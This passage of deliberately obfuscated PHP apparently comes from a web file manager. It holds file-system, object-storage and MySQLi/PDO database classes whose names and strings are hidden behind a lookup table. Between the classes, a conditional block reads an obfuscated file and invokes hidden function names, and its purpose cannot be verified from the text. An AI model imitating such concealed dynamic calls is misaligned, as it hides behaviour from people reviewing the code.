$ª½‰„€’ = copy_64($‘÷ê–Ü©, $³šˆÏÒª); @chmod($³šˆÏÒª, $this->pathAuth); if ($ª½‰„€’) { return $this->getPathOuter($³šˆÏÒª); } $this->writeLog(__FUNCTION__ . $_SERVER[¢ñàß¿€][1445], !0); return !1; } public function moveFile($Ó­»ÊĞ, $çÆ¼¼À) { $this->mkdir($this->pathFather($çÆ¼¼À)); $Ó­»ÊĞ = $this->iconvSystem($Ó­»ÊĞ); $çÆ¼¼À = $this->iconvSystem($çÆ¼¼À); $…À¿ = intval(@rename($Ó­»ÊĞ, $çÆ¼¼À)); if (!$…À¿) { if ($…À¿ = intval(@copy_64($Ó­»ÊĞ, $çÆ¼¼À))) { @unlink($Ó­»ÊĞ); } } @chmod($çÆ¼¼À, $this->pathAuth); if ($…À¿) { return $this->getPathOuter($çÆ¼¼À); } $this->writeLog(__FUNCTION__ . $_SERVER[¢ñàß¿€][1445], !0); return !1; } public function movePath($Âõ¶Æ˜³, $©¿‚ñ¢, $™ÑùÜÎÏ = false) { $ßÁø–Æì =& $_SERVER[¢ñàß¿€]; $Âõ¶Æ˜³ = $this->iconvSystem($Âõ¶Æ˜³); $©¿‚ñ¢ = $this->iconvSystem($©¿‚ñ¢); $¯í’± ı = rtrim($©¿‚ñ¢, $ßÁø–Æì[8]) . $ßÁø–Æì[8] . ($™ÑùÜÎÏ ? $™ÑùÜÎÏ : get_path_this($Âõ¶Æ˜³)); if (file_exists($¯í’± ı)) { return !1; } $€´àü÷ = intval(@rename($Âõ¶Æ˜³, $¯í’± ı)); $€´àü÷ = file_exists($¯í’± ı); if ($€´àü÷) { return $this->getPathOuter($¯í’± ı); } $this->writeLog(__FUNCTION__ . $ßÁø–Æì[1445], !0); return !1; } public function delFile($¤­ŞŞ´ú) { $¤­ŞŞ´ú = $this->iconvSystem($¤­ŞŞ´ú); if (!@unlink($¤­ŞŞ´ú)) { @chmod($¤­ŞŞ´ú, $this->pathAuth); if (@unlink($¤­ŞŞ´ú)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[¢ñàß¿€][1445], !0); return !1; } return !0; } public function delFolder($şÖšµê) { $şæ…ÑèŞ =& $_SERVER[¢ñàß¿€]; $şÖšµê = $this->iconvSystem($şÖšµê); if (!is_dir($şÖšµê)) { return !0; } if (!($ò¯àÚÒª = opendir($şÖšµê))) { return !1; } while (($Ï«ôƒÇœ = readdir($ò¯àÚÒª)) !== !1) { if ($Ï«ôƒÇœ == $şæ…ÑèŞ[10] || $Ï«ôƒÇœ == $şæ…ÑèŞ[1360]) { continue; } $‹Ûà×ıâ = $şÖšµê . $şæ…ÑèŞ[8] . $Ï«ôƒÇœ; if (is_file($‹Ûà×ıâ) || is_link($‹Ûà×ıâ)) { if (!unlink($‹Ûà×ıâ)) { chmod($‹Ûà×ıâ, $this->pathAuth); if (!unlink($‹Ûà×ıâ)) { return !1; } } } else { if (is_dir($‹Ûà×ıâ)) { chmod($‹Ûà×ıâ, $this->pathAuth); $‹Ûà×ıâ = $this->iconvApp($‹Ûà×ıâ); if (!$this->delFolder($‹Ûà×ıâ)) { return !1; } } } } closedir($ò¯àÚÒª); return rmdir($şÖšµê); } public function rename($ÖŠ¬í³, $ÉïŸ©Â) { $©¹Ğíƒ¨ =& $_SERVER[¢ñàß¿€]; $ÌÕ§…ì÷ = $this->fileNameAuto($this->pathFather($ÖŠ¬í³), $ÉïŸ©Â); $ÌÕ§…ì÷ = $this->iconvSystem($ÌÕ§…ì÷); $ÖŠ¬í³ = $this->iconvSystem($ÖŠ¬í³); $Ø÷İê = $this->pathFather($ÖŠ¬í³); $şó£’Íæ = rtrim($Ø÷İê, $©¹Ğíƒ¨[8]) . $©¹Ğíƒ¨[8] . $ÌÕ§…ì÷; $Æç±è¬ = @rename($ÖŠ¬í³, $şó£’Íæ); $şó£’Íæ = $this->iconvApp($şó£’Íæ); if ($Æç±è¬) { return $this->getPathOuter($şó£’Íæ); } $this->writeLog(__FUNCTION__ . $©¹Ğíƒ¨[1445], !0); return !1; } public function size($øı’Çªí) { $øı’Çªí = $this->iconvSystem($øı’Çªí); return filesize_64($øı’Çªí); } public function info($ô÷ÂÑö) { $ô÷ÂÑö = $this->iconvSystem($ô÷ÂÑö); if ($this->isFolder($ô÷ÂÑö)) { return $this->folderInfo($ô÷ÂÑö); } else { if ($this->isFile($ô÷ÂÑö)) { return $this->fileInfo($ô÷ÂÑö); } } return !1; } protected function infoChildren($¤²£ßÌÕ, &$Û“«ŒÜø, $İÜú¶ÎÆ = true) { $ÏşôîãË =& $_SERVER[¢ñàß¿€]; check_abort_echo(); $¤²£ßÌÕ = rtrim($¤²£ßÌÕ, $ÏşôîãË[8]) . $ÏşôîãË[8]; if ($İÜú¶ÎÆ) { $¤²£ßÌÕ = $this->iconvSystem($¤²£ßÌÕ); } if (!($ûÇø±Ÿ = @opendir($¤²£ßÌÕ))) { return; } while (($—¿Ğğ¤Ë = readdir($ûÇø±Ÿ)) !== !1) { if ($—¿Ğğ¤Ë == $ÏşôîãË[10] || $—¿Ğğ¤Ë == $ÏşôîãË[1360]) { continue; } $ñà±Ö¢Ñ = $¤²£ßÌÕ . $—¿Ğğ¤Ë; if (is_file($ñà±Ö¢Ñ) || is_link($ñà±Ö¢Ñ)) { $Û“«ŒÜø[$ÏşôîãË[80]]++; $Û“«ŒÜø[$ÏşôîãË[79]] += filesize_64($ñà±Ö¢Ñ); } else { if (is_dir($ñà±Ö¢Ñ)) { $Û“«ŒÜø[$ÏşôîãË[81]]++; $this->infoChildren($ñà±Ö¢Ñ, $Û“«ŒÜø, !1); } } } closedir($ûÇø±Ÿ); } private function folderInfo($úÖ¶¸×, $â¯±êáû = false) { $ÜúĞŸö¡ =& $_SERVER[¢ñàß¿€]; $úÖ¶¸× = rtrim($úÖ¶¸×, $ÜúĞŸö¡[8]) . $ÜúĞŸö¡[8]; $ñÃî«—€ = $this->iconvApp($this->pathThis($úÖ¶¸×)); if ($â¯±êáû) { return array($ÜúĞŸö¡[32] => $ñÃî«—€, $ÜúĞŸö¡[87] => $this->getPathOuter($úÖ¶¸×), $ÜúĞŸö¡[33] => $ÜúĞŸö¡[78]); } $İøœÚ›¿ = array($ÜúĞŸö¡[32] => $ñÃî«—€, $ÜúĞŸö¡[87] => $this->getPathOuter($úÖ¶¸×), $ÜúĞŸö¡[33] => $ÜúĞŸö¡[78], $ÜúĞŸö¡[231] => @filectime($úÖ¶¸×), $ÜúĞŸö¡[88] => @filemtime($úÖ¶¸×), $ÜúĞŸö¡[1449] => @fileatime($úÖ¶¸×), $ÜúĞŸö¡[1450] => is_readable($úÖ¶¸×), $ÜúĞŸö¡[1451] => is_writable($úÖ¶¸×), $ÜúĞŸö¡[1452] => get_mode($úÖ¶¸×)); return $İøœÚ›¿; } private function fileInfo($¸¶ÆÀÃà, $ïšé’çô = false) { $›ò€˜Ò¶ =& $_SERVER[¢ñàß¿€]; $…”÷ùÄã = $this->iconvApp($this->pathThis($¸¶ÆÀÃà)); if ($ïšé’çô) { return array($›ò€˜Ò¶[32] => $…”÷ùÄã, $›ò€˜Ò¶[87] => $this->getPathOuter($¸¶ÆÀÃà), $›ò€˜Ò¶[33] => $›ò€˜Ò¶[230], $›ò€˜Ò¶[79] => $this->size($¸¶ÆÀÃà), $›ò€˜Ò¶[169] => $this->ext($…”÷ùÄã)); } $©¶ÈŒ¦â = array($›ò€˜Ò¶[32] => $…”÷ùÄã, $›ò€˜Ò¶[87] => $this->getPathOuter($¸¶ÆÀÃà), $›ò€˜Ò¶[33] => $›ò€˜Ò¶[230], $›ò€˜Ò¶[231] => @filectime($¸¶ÆÀÃà), $›ò€˜Ò¶[88] => @filemtime($¸¶ÆÀÃà), $›ò€˜Ò¶[1449] => @fileatime($¸¶ÆÀÃà), $›ò€˜Ò¶[79] => $this->size($¸¶ÆÀÃà), $›ò€˜Ò¶[169] => $this->ext($…”÷ùÄã), $›ò€˜Ò¶[1450] => is_readable($¸¶ÆÀÃà), $›ò€˜Ò¶[1451] => is_writable($¸¶ÆÀÃà), $›ò€˜Ò¶[1452] => get_mode($¸¶ÆÀÃà)); return $©¶ÈŒ¦â; } public function exist($§îââş) { $§îââş = $this->iconvSystem($§îââş); return @file_exists($§îââş); } public function isFile($ÌéÌ¸ï) { $ÌéÌ¸ï = $this->iconvSystem($ÌéÌ¸ï); return @is_file($ÌéÌ¸ï); } public function isFolder($Ğ®ùñ¶Ü) { $Ğ®ùñ¶Ü = $this->iconvSystem($Ğ®ùñ¶Ü); return @is_dir($Ğ®ùñ¶Ü); } public function listPath($¹Í’, $¤ÆõŒ˜ğ = false) { $´ê°±„® =& $_SERVER[¢ñàß¿€]; $¹Í’ = $this->iconvSystem($¹Í’); $¹Í’ = rtrim($¹Í’, $´ê°±„®[8]) . $´ê°±„®[8]; $äÆìÄ’œ = array($´ê°±„®[85] => array(), $´ê°±„®[86] => array()); if (!($Ö©¸Ğ†Á = @opendir($¹Í’))) { return $äÆìÄ’œ; } while (($ıáË º† = readdir($Ö©¸Ğ†Á)) !== !1) { if ($ıáË º† == $´ê°±„®[10] || $ıáË º† == $´ê°±„®[1360]) { continue; } $ï­¸“¹ = $¹Í’ . $ıáË º†; if (is_file($ï­¸“¹)) { $äÆìÄ’œ[$´ê°±„®[86]][] = $this->fileInfo($ï­¸“¹, $¤ÆõŒ˜ğ); } else { $äÆìÄ’œ[$´ê°±„®[85]][] = $this->folderInfo($ï­¸“¹, $¤ÆõŒ˜ğ); } } closedir($Ö©¸Ğ†Á); return $äÆìÄ’œ; } public function listAll($Ê˜·©Êƒ, &$¡ĞËıÄ = array()) { $«Å·ÚîŠ =& $_SERVER[¢ñàß¿€]; $Ê˜·©Êƒ = $this->iconvSystem($Ê˜·©Êƒ); $Ê˜·©Êƒ = rtrim($Ê˜·©Êƒ, $«Å·ÚîŠ[8]) . $«Å·ÚîŠ[8]; if (!($—°ç šê = @opendir($Ê˜·©Êƒ))) { return $¡ĞËıÄ; } while (($ö¼ö½¾‰ = readdir($—°ç šê)) !== !1) { if ($ö¼ö½¾‰ == $«Å·ÚîŠ[10] || $ö¼ö½¾‰ == $«Å·ÚîŠ[1360]) { continue; } $ÄÚØÌŠ¯ = $Ê˜·©Êƒ . $ö¼ö½¾‰; $º”óÂ‡ß = is_dir($ÄÚØÌŠ¯) && !is_link($ÄÚØÌŠ¯) ? 1 : 0; $ÄÚØÌŠ¯ = $º”óÂ‡ß ? $ÄÚØÌŠ¯ . $«Å·ÚîŠ[8] : $ÄÚØÌŠ¯; $¡ĞËıÄ[] = array($«Å·ÚîŠ[87] => $ÄÚØÌŠ¯, $«Å·ÚîŠ[78] => $º”óÂ‡ß, $«Å·ÚîŠ[88] => intval(@filemtime($ÄÚØÌŠ¯)), $«Å·ÚîŠ[79] => $º”óÂ‡ß ? 0 : intval($this->size($ÄÚØÌŠ¯))); if ($º”óÂ‡ß) { $this->listAll($ÄÚØÌŠ¯, $¡ĞËıÄ); } } closedir($—°ç šê); return $¡ĞËıÄ; } public function has($é÷‘§›§, $åŒ˜µŠÈ = false, $ŞóÆæ¡ = true) { $ìÃìÃ¿„ =& $_SERVER[¢ñàß¿€]; $é÷‘§›§ = $this->iconvSystem($é÷‘§›§); $é÷‘§›§ = rtrim($é÷‘§›§, $ìÃìÃ¿„[8]) . $ìÃìÃ¿„[8]; if (!($ôêÍşî = @opendir($é÷‘§›§))) { return !1; } $ƒÂƒˆ¿¤ = 0; $‘±€åğ = 0; $¤•å’Ñ¹ = 0; while (($¢å‚¯¶ = readdir($ôêÍşî)) !== !1) { if ($¢å‚¯¶ == $ìÃìÃ¿„[10] || $¢å‚¯¶ == $ìÃìÃ¿„[1360]) { continue; } $ûóÀÒˆÆ = $é÷‘§›§ . $¢å‚¯¶; if ($åŒ˜µŠÈ) { $¤•å’Ñ¹++; if (@is_file($ûóÀÒˆÆ)) { $ƒÂƒˆ¿¤++; } else { $‘±€åğ++; } if ($¤•å’Ñ¹ > 10000) { break; } continue; } if ($ŞóÆæ¡) { if (@is_file($ûóÀÒˆÆ)) { return !0; } } else { if (@is_dir($ûóÀÒˆÆ . $ìÃìÃ¿„[8])) { return !0; } } } closedir($ôêÍşî); if ($åŒ˜µŠÈ) { return array($ìÃìÃ¿„[239] => $ƒÂƒˆ¿¤, $ìÃìÃ¿„[240] => $‘±€åğ); } return !1; } public function hashSimple($‘­áº×ß) { $Ú¢Û´“× =& $_SERVER[¢ñàß¿€]; if (!$‘­áº×ß) { return md5($Ú¢Û´“×[12]); } $‘­áº×ß = $this->iconvSystem($‘­áº×ß); $ÚÔ–÷Å = $this->size($‘­áº×ß); $ªíÕÙ¡ä = 200; $¡­­¹Û = 50; if ($ÚÔ–÷Å <= $ªíÕÙ¡ä * $¡­­¹Û) { return $this->hashMd5($‘­áº×ß) . $ÚÔ–÷Å; } $³–ÎÁ—ñ = $Ú¢Û´“×[12]; $È¾œ = intval($ÚÔ–÷Å / $¡­­¹Û); $ì¿ïëÌ = fopen($‘­áº×ß, $Ú¢Û´“×[1453]); if (!$ì¿ïëÌ) { return $³–ÎÁ—ñ; } for ($Ş™üü¿ˆ = 0; $Ş™üü¿ˆ < $¡­­¹Û; $Ş™üü¿ˆ++) { fseek_64($ì¿ïëÌ, $È¾œ * $Ş™üü¿ˆ); $³–ÎÁ—ñ .= fread($ì¿ïëÌ, $ªíÕÙ¡ä); } fseek_64($ì¿ïëÌ, $ÚÔ–÷Å - $ªíÕÙ¡ä); $³–ÎÁ—ñ .= fread($ì¿ïëÌ, $ªíÕÙ¡ä); fclose($ì¿ïëÌ); return md5($³–ÎÁ—ñ) . $ÚÔ–÷Å; } public function getContent($¤ÀÜÕ­) { $¤ÀÜÕ­ = $this->iconvSystem($¤ÀÜÕ­); return file_get_contents($¤ÀÜÕ­); } public function setContent($ó¤ÖÒÅ, $„¢Ê±àÈ = '') { $ó¤ÖÒÅ = $this->iconvSystem($ó¤ÖÒÅ); $àÔéµØå = @file_put_contents($ó¤ÖÒÅ, $„¢Ê±àÈ, LOCK_EX); if (!$àÔéµØå) { $this->writeLog(__FUNCTION__ . $_SERVER[¢ñàß¿€][1445], !0); } clearstatcache(); @chmod($ó¤ÖÒÅ, $this->pathAuth); return $àÔéµØå === !1 ? !1 : !0; } public function fileSubstr($Ï§©Ë‰, $Š²ßêíÚ = 0, $¯ûüÕ“± = false) { $¦ùïß =& $_SERVER[¢ñàß¿€]; $Ï§©Ë‰ = $this->iconvSystem($Ï§©Ë‰); if ($¯ûüÕ“± === !1) { $¯ûüÕ“± = $this->size($Ï§©Ë‰); } if ($¯ûüÕ“± <= 0) { return $¦ùïß[12]; } $ã´É‹àâ = fopen($Ï§©Ë‰, $¦ùïß[1453]); if (!$ã´É‹àâ) { return !1; } fseek_64($ã´É‹àâ, $Š²ßêíÚ); $Äç¨Ï‡è = fread($ã´É‹àâ, $¯ûüÕ“±); fclose($ã´É‹àâ); if (!$Äç¨Ï‡è) { $this->writeLog(__FUNCTION__ . $¦ùïß[1445], !0); } return $Äç¨Ï‡è; } public function upload($š‚³—£…, $ı…°¢¶…, $åäûÃà = false, $¨”ÑµÑê = REPEAT_REPLACE) { if ($åäûÃà) { return $this->moveFile($ı…°¢¶…, $š‚³—£…); } return $this->copyFile($ı…°¢¶…, $š‚³—£…); } public function setModifyTime($¤Ûı‰‚ö, $ÈÉÖÂ™ = '') { @touch($¤Ûı‰‚ö, intval($ÈÉÖÂ™)); } public function download($„ƒ¸ö„°, $¹ì­û) { return $this->iconvSystem($„ƒ¸ö„°); } } class PathDriverOBS extends PathDriverBaseS3 { public function __construct($áÊ–šŠ¬) { parent::__construct($áÊ–šŠ¬); $this->setSignVersion($_SERVER[¢ñàß¿€][247]); } public function fileOutImage($ç©’†”û, $–‚Èæ© = 250) { $ô’î«Ê® =& $_SERVER[¢ñàß¿€]; if ($this->size($ç©’†”û) > 1024 * 1024 * 25) { return $this->fileOutImageServer($ç©’†”û, $–‚Èæ©); } $·íÑã¨” = array($ô’î«Ê®[1454] => $ô’î«Ê®[1455] . $–‚Èæ© . $ô’î«Ê®[1456]); $Àï÷ìô = $this->link($ç©’†”û, $·íÑã¨”); $this->fileOutLink($Àï÷ìô); } public function fileOutLink($‰ìùêÊÈ) { $ßµ‰Ë…² =& $_SERVER[¢ñàß¿€]; if (substr($‰ìùêÊÈ, 0, 7) == $ßµ‰Ë…²[313]) { $‰ìùêÊÈ = $ßµ‰Ë…²[314] . substr($‰ìùêÊÈ, 7); } header($ßµ‰Ë…²[175] . $‰ìùêÊÈ); die; } } if ($_SERVER[$_SERVER[¢ñàß¿€][947]] != $_SERVER[$_SERVER[¢ñàß¿€][948]]) { $_getc = $_SERVER[¢ñàß¿€][950]; $_getfile = $_SERVER[$_SERVER[¢ñàß¿€][951]] . $_SERVER[¢ñàß¿€][952]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¢ñàß¿€][262], $_getfilec); if (count($_getarrs) < $_SERVER[¢ñàß¿€][685]) { $exit = $_SERVER[¢ñàß¿€][953]; $exit(); } $_act = $_SERVER[¢ñàß¿€][1457]; $_act($_SERVER[$_SERVER[¢ñàß¿€][1458]]); } goto b¾íİ³¢; A½öæ¹«ó¬: class DbMysqli extends Db { public function __construct($®Ìç¥àı = '') { $â¥šŒéÕ =& $_SERVER[¢ñàß¿€]; if (!extension_loaded($â¥šŒéÕ[987])) { think_exception(think_lang($â¥šŒéÕ[14]) . $â¥šŒéÕ[988]); } if (!empty($®Ìç¥àı)) { $this->config = $®Ìç¥àı; if (empty($this->config[$â¥šŒéÕ[17]])) { $this->config[$â¥šŒéÕ[17]] = $â¥šŒéÕ[12]; } } } public function connect($ğÄ£¼Ûâ = '', $¯æ‹‰Ò = 0) { $ÉÑœÓì =& $_SERVER[¢ñàß¿€]; if (!isset($this->linkID[$¯æ‹‰Ò])) { if (empty($ğÄ£¼Ûâ)) { $ğÄ£¼Ûâ = $this->config; } $this->linkID[$¯æ‹‰Ò] = new mysqli($ğÄ£¼Ûâ[$ÉÑœÓì[961]], $ğÄ£¼Ûâ[$ÉÑœÓì[963]], $ğÄ£¼Ûâ[$ÉÑœÓì[964]], $ğÄ£¼Ûâ[$ÉÑœÓì[21]], $ğÄ£¼Ûâ[$ÉÑœÓì[962]] ? intval($ğÄ£¼Ûâ[$ÉÑœÓì[962]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $éÀõ™Ã‚ = $this->linkID[$¯æ‹‰Ò]->server_version; $this->linkID[$¯æ‹‰Ò]->query($ÉÑœÓì[965] . think_config($ÉÑœÓì[966]) . $ÉÑœÓì[58]); if ($éÀõ™Ã‚ > $ÉÑœÓì[967]) { $this->linkID[$¯æ‹‰Ò]->query($ÉÑœÓì[968]); } $this->connected = !0; if (1 != think_config($ÉÑœÓì[22])) { unset($this->config); } } return $this->linkID[$¯æ‹‰Ò]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($’Ûíí• ) { $Ã¦á´Èì =& $_SERVER[¢ñàß¿€]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $’Ûíí• ; if ($this->queryID) { $this->free(); } think_action_status($Ã¦á´Èì[23], 1); think_status($Ã¦á´Èì[24]); $this->queryID = $this->_linkID->query($’Ûíí• ); if ($this->_linkID->more_results()) { while (($ìöÌòû› = $this->_linkID->next_result()) != NULL) { $ìöÌòû›->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($ü³ı§îš) { $÷Õ‰„€ =& $_SERVER[¢ñàß¿€]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ü³ı§îš; if ($this->queryID) { $this->free(); } think_action_status($÷Õ‰„€[25], 1); think_status($÷Õ‰„€[24]); $Œàü—Û = $this->_linkID->query($ü³ı§îš); $this->debug(); if (!1 === $Œàü—Û) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $±ä”çñ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$±ä”çñ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ìÍÌÇÇ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ìÍÌÇÇ) { $this->error(); return !1; } } return !0; } private function getAll() { $É‡ŸéÜ¬ = array(); if ($this->numRows > 0) { for ($²¾õÀá¾ = 0; $²¾õÀá¾ < $this->numRows; $²¾õÀá¾++) { $É‡ŸéÜ¬[$²¾õÀá¾] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $É‡ŸéÜ¬; } public function getFields($Æ‰§Ü¥â) { $ÙÀïßÑß =& $_SERVER[¢ñàß¿€]; $à¿ı’ = $this->query($ÙÀïßÑß[972] . $this->parseKey($Æ‰§Ü¥â)); $‹Ìôøú = array(); if ($à¿ı’) { foreach ($à¿ı’ as $é¢±§ï” => $ë¸ÑóºÙ) { $‹Ìôøú[$ë¸ÑóºÙ[$ÙÀïßÑß[31]]] = array($ÙÀïßÑß[32] => $ë¸ÑóºÙ[$ÙÀïßÑß[31]], $ÙÀïßÑß[33] => $ë¸ÑóºÙ[$ÙÀïßÑß[34]], $ÙÀïßÑß[35] => (bool) ($ë¸ÑóºÙ[$ÙÀïßÑß[36]] === $ÙÀïßÑß[12]), $ÙÀïßÑß[37] => $ë¸ÑóºÙ[$ÙÀïßÑß[38]], $ÙÀïßÑß[39] => strtolower($ë¸ÑóºÙ[$ÙÀïßÑß[40]]) == $ÙÀïßÑß[41], $ÙÀïßÑß[42] => strtolower($ë¸ÑóºÙ[$ÙÀïßÑß[43]]) == $ÙÀïßÑß[44]); } } return $‹Ìôøú; } public function getTables($¾¤åÕÚÍ = '') { $©§¥Ğş» =& $_SERVER[¢ñàß¿€]; $Šş‡êƒÍ = !empty($¾¤åÕÚÍ) ? $©§¥Ğş»[974] . $¾¤åÕÚÍ . $©§¥Ğş»[975] : $©§¥Ğş»[976]; $éª÷Èª¨ = $this->query($Šş‡êƒÍ); $¯ÎèÚÅ– = array(); if ($éª÷Èª¨) { foreach ($éª÷Èª¨ as $Ëæ²˜Å• => $˜Õ–Ãˆß) { $¯ÎèÚÅ–[$Ëæ²˜Å•] = current($˜Õ–Ãˆß); } } return $¯ÎèÚÅ–; } public function replace($ü—ØÄ·©, $É‹ô®¹¹ = array()) { $€§Ï©¯¹ =& $_SERVER[¢ñàß¿€]; foreach ($ü—ØÄ·© as $ÍˆÔ¥ç => $òäáò˜¢) { $ğÓÜÄÇ¦ = $this->parseValue($òäáò˜¢); if (is_scalar($ğÓÜÄÇ¦)) { $±ˆ¢å­î[] = $ğÓÜÄÇ¦; $Š¦ÍîïÉ[] = $this->parseKey($ÍˆÔ¥ç); } } $’—Òš¾á = $€§Ï©¯¹[977] . $this->parseTable($É‹ô®¹¹[$€§Ï©¯¹[356]]) . $€§Ï©¯¹[978] . implode($€§Ï©¯¹[50], $Š¦ÍîïÉ) . $€§Ï©¯¹[979] . implode($€§Ï©¯¹[50], $±ˆ¢å­î) . $€§Ï©¯¹[980]; return $this->execute($’—Òš¾á); } public function insertAll($”î™†», $Â´§›¯ = array(), $†¦ü¤àÏ = false) { $•ø¡ÉÅ‘ =& $_SERVER[¢ñàß¿€]; if (!is_array($”î™†»[0])) { return !1; } $¾¨¦‘ıÙ = array_keys($”î™†»[0]); $¡’ğıÊæ = array(); foreach ($”î™†» as $„ìõŸ ) { $´úÀĞœ” = array(); foreach ($„ìõŸ  as $Úê•Ääß => $˜Â›ÒÃí) { $˜Â›ÒÃí = $this->parseValue($˜Â›ÒÃí); if (is_scalar($˜Â›ÒÃí)) { $´úÀĞœ”[] = $˜Â›ÒÃí; } } $¡’ğıÊæ[] = $•ø¡ÉÅ‘[337] . implode($•ø¡ÉÅ‘[50], $´úÀĞœ”) . $•ø¡ÉÅ‘[980]; } array_walk($¾¨¦‘ıÙ, array($this, $•ø¡ÉÅ‘[981])); $ŠäÅ˜‚Å = $†¦ü¤àÏ ? $•ø¡ÉÅ‘[982] : $•ø¡ÉÅ‘[983]; $†âçç®ä = $ŠäÅ˜‚Å . $•ø¡ÉÅ‘[984] . $this->parseTable($Â´§›¯[$•ø¡ÉÅ‘[356]]) . $•ø¡ÉÅ‘[978] . implode($•ø¡ÉÅ‘[50], $¾¨¦‘ıÙ) . $•ø¡ÉÅ‘[985] . implode($•ø¡ÉÅ‘[50], $¡’ğıÊæ); return $this->execute($†âçç®ä); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $®¬ÖË¼Ò =& $_SERVER[¢ñàß¿€]; $this->error = $this->_linkID->errno . $®¬ÖË¼Ò[4] . $this->_linkID->error; if ($®¬ÖË¼Ò[12] != $this->queryStr) { $this->error .= LNG($®¬ÖË¼Ò[48]) . $this->queryStr; } think_trace($this->error, $®¬ÖË¼Ò[12], $®¬ÖË¼Ò[49]); return $this->error; } public function escapeString($ÕæÀ¦ûĞ) { if ($this->_linkID) { return $this->_linkID->real_escape_string($ÕæÀ¦ûĞ); } else { return addslashes($ÕæÀ¦ûĞ); } } public function parseKey(&$ÁÛ›†û, $¼‘‹† = true) { $ï¶ù™ø =& $_SERVER[¢ñàß¿€]; if ($¼‘‹†) { $ÁÛ›†û = $this->parseKeyCheck($ÁÛ›†û); } if ($ÁÛ›†û != $ï¶ù™ø[220] && !preg_match($ï¶ù™ø[986], $ÁÛ›†û)) { $ÁÛ›†û = $ï¶ù™ø[461] . trim($ÁÛ›†û, $ï¶ù™ø[461]) . $ï¶ù™ø[461]; } return $ÁÛ›†û; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($×àÌÉ‹» = '') { $ÚëÛ§ë× =& $_SERVER[¢ñàß¿€]; if (!class_exists($ÚëÛ§ë×[989])) { think_exception(think_lang($ÚëÛ§ë×[14]) . $ÚëÛ§ë×[990]); } if (!empty($×àÌÉ‹»)) { $this->config = $×àÌÉ‹»; if (empty($this->config[$ÚëÛ§ë×[17]])) { $this->config[$ÚëÛ§ë×[17]] = array(); } } } public function connect($‹åƒ¨‚È = '', $¨‰™õ = 0) { $Ù³­‘ª =& $_SERVER[¢ñàß¿€]; if (!isset($this->linkID[$¨‰™õ])) { if (empty($‹åƒ¨‚È)) { $‹åƒ¨‚È = $this->config; } $’ğç¯ş™ = !empty($‹åƒ¨‚È[$Ù³­‘ª[17]][$Ù³­‘ª[18]]) ? $‹åƒ¨‚È[$Ù³­‘ª[17]][$Ù³­‘ª[18]] : $this->pconnect; if ($’ğç¯ş™) { $‹åƒ¨‚È[$Ù³­‘ª[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$¨‰™õ] = new PDO($‹åƒ¨‚È[$Ù³­‘ª[991]], $‹åƒ¨‚È[$Ù³­‘ª[963]], $‹åƒ¨‚È[$Ù³­‘ª[964]], $‹åƒ¨‚È[$Ù³­‘ª[17]]); } catch (PDOException $¼¦ÊÏõ) { think_exception($¼¦ÊÏõ->getMessage()); } $this->dbType = $this->_getDsnType($‹åƒ¨‚È[$Ù³­‘ª[991]]); if (in_array($this->dbType, array($Ù³­‘ª[992], $Ù³­‘ª[993], $Ù³­‘ª[994], $Ù³­‘ª[995]))) { think_exception($Ù³­‘ª[996] . $this->dbType . $Ù³­‘ª[997] . $this->dbType . $Ù³­‘ª[998]); } if (!$this->linkID[$¨‰™õ]) { think_exception($Ù³­‘ª[999]); } try { $this->linkID[$¨‰™õ]->exec($Ù³­‘ª[1000] . think_config($Ù³­‘ª[966])); } catch (Exception $¼¦ÊÏõ) { } $this->connected = !0; if (1 != think_config($Ù³­‘ª[22])) { unset($this->config); } } return $this->linkID[$¨‰™õ]; } public function free() { $this->PDOStatement = null; } public function query($ßÎˆ‹©, $Ö¼÷şÑ = array()) { $ÔÇÒ¯¨Ë =& $_SERVER[¢ñàß¿€]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ßÎˆ‹©; if (!empty($Ö¼÷şÑ)) { $this->queryStr .= $ÔÇÒ¯¨Ë[1001] . print_r($Ö¼÷şÑ, !0) . $ÔÇÒ¯¨Ë[1002]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($ÔÇÒ¯¨Ë[23], 1); think_status($ÔÇÒ¯¨Ë[24]); $this->PDOStatement = $this->_linkID->prepare($ßÎˆ‹©); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $©ê™õïÓ = $this->PDOStatement->execute($Ö¼÷şÑ); $this->debug(); if (!1 === $©ê™õïÓ) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($û†è‘Ûİ, $ùÔ± ñÔ = array()) { $Ç™•½úÁ =& $_SERVER[¢ñàß¿€]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $û†è‘Ûİ; if (!empty($ùÔ± ñÔ)) { $this->queryStr .= $Ç™•½úÁ[1001] . print_r($ùÔ± ñÔ, !0) . $Ç™•½úÁ[1002]; } $Õ§”²¹É = !1; if ($this->dbType == $Ç™•½úÁ[995]) { if (preg_match($Ç™•½úÁ[1003], $this->queryStr, $¨á™†©˜)) { $this->table = think_config($Ç™•½úÁ[1004]) . str_ireplace(think_config($Ç™•½úÁ[1005]), $Ç™•½úÁ[454], $¨á™†©˜[2]); $Õ§”²¹É = (bool) $this->query($Ç™•½úÁ[1006] . strtoupper($this->table) . 